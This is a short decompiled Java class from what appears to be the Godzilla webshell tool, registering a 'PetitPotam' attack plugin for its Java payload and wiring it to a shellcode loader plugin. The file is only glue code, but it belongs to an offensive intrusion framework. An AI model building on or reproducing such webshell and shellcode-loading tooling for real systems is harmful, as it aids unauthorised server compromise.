/*    */ package shells.plugins.java;
/*    */ 
/*    */ import core.annotation.PluginAnnotation;
/*    */ import shells.plugins.generic.PetitPotam;
/*    */ import shells.plugins.generic.ShellcodeLoader;
/*    */ 
/*    */ @PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "PetitPotam", DisplayName = "PetitPotam")
/*    */ public class PetitPotam extends PetitPotam {
/*    */   protected ShellcodeLoader getShellcodeLoader() {
/* 10 */     return (ShellcodeLoader)this.shellEntity.getFrame().getPlugin("ShellcodeLoader");
/*    */   }
/*    */ }


/* Location:              C:\User\\user\Downloads\godzilla.jar!\shells\plugins\java\PetitPotam.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */